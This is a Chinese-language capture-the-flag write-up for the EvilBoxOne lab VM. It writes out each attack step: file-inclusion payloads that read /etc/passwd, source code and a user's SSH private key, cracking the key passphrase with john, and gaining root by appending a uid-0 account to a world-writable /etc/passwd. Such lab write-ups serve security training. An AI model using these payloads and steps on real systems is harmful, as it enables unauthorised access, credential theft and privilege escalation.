**环境**：靶机 10.0.2.4（EvilBoxOne，Debian），攻击机 Kali 10.0.2.15。

### **<span style="color:#3498db">信息收集</span>**

nmap 只有 22 和 80；dirsearch 扫出 `robots.txt` 和 `/secret/`：

![mm](/assets/img/2025-06-20-17-25-16.png)
![mm](/assets/img/2025-06-20-17-22-23.png)

`robots.txt` 里像是一行用户名，`/secret` 目录直接访问返回空白——**空白但没有 404**，说明目录存在，里面有东西，继续对这目录爆破文件：

![mm](/assets/img/2025-06-20-17-27-09.png)

### **<span style="color:#3498db">爆破参数名</span>**

`/secret` 下爆出 `index.html` 和 `evil.php`，两个都返回空白。PHP 文件多半要靠参数才能干活，但参数名不知道——那就**爆破参数名**（改一处参数名，看响应有没有变化）：

![mm](/assets/img/2025-06-20-18-29-15.png)

爆出 `command` 参数。访问 `evil.php?command=/etc/passwd`，直接读出文件内容——**任意文件读取/包含**：

![mm](/assets/img/2025-06-20-19-31-11.png)

用 php://filter 读它自己的源码确认（伪协议读文件时会先做 base64 编码，把代码当数据输出）：

```text
evil.php?command=php://filter/convert.base64-encode/resource=evil.php
```

![mm](/assets/img/2025-06-20-19-33-06.png)

### **<span style="color:#3498db">读 SSH 私钥</span>**

试了日志投毒读 nginx 日志，返回空白——**日志文件属于 root，www-data 没权限读**，这条路不通。

换思路：刚才读到的 `/etc/passwd` 里唯一一个非系统用户是 `mowree`（跑 apache 的就是他），那他的家目录下大概率有 `.ssh`。直接读：

```text
evil.php?command=/home/mowree/.ssh/id_rsa
```

一把梭，私钥原文直接拉出来（还是加密的，头部有 `ENCRYPTED`）：

![mm](/assets/img/2025-06-20-20-23-22.png)

下载到本地、改权限、直接连。**openssh 对私钥文件的权限校验很严格**（太开放会拒绝使用），所以先 `chmod 600`：

```bash
curl -o id_rsa "http://10.0.2.4/secret/evil.php?command=/home/mowree/.ssh/id_rsa"
chmod 600 id_rsa
ssh -i id_rsa mowree@10.0.2.4
```

![mm](/assets/img/2025-06-20-20-40-12.png)

连接时提示要私钥的 passphrase——私钥有口令，爆破它：

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# unicorn  (id_rsa)
```

![mm](/assets/img/2025-06-20-20-57-35.png)

```bash
ssh -i id_rsa mowree@10.0.2.4    # 输入口令 unicorn
cat user.txt
```

![mm](/assets/img/2025-06-20-20-59-24.png)

登录成功，拿到 user flag。

### **<span style="color:#3498db">提权：所有人可写的 /etc/passwd</span>**

sudo -l 没东西、getcap 命令不存在、SUID 全是系统常规文件，都没戏。回头检查基础配置，`/etc/passwd` 的权限很扎眼——**`-rw-rw-rw-`，所有人可写**：

![mm](/assets/img/2025-06-20-21-24-55.png)

`/etc/passwd` 里每行就是一个用户，密码字段（第二个冒号）本来是 `x`（代表密码在 shadow 里）。既然文件可写，就**自己造一个 uid=0 的用户**塞进去；密码不能明文，先算个 hash：

```bash
openssl passwd -1 12345
# $1$TB2QiIVL$K4NbK3YxFE.Q46Ys0DzGn0
echo 'hack:$1$TB2QiIVL$K4NbK3YxFE.Q46Ys0DzGn0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

这里有个小坑：**格式必须严格**，第一次多打了一个 `/` 直接认证失败（`Fallo de autenticación`）：

![mm](/assets/img/2025-06-20-21-40-12.png)

改对格式后 `su - hack`（密码就是刚才设的 12345），直接成为 root：

![mm](/assets/img/2025-06-20-21-42-06.png)
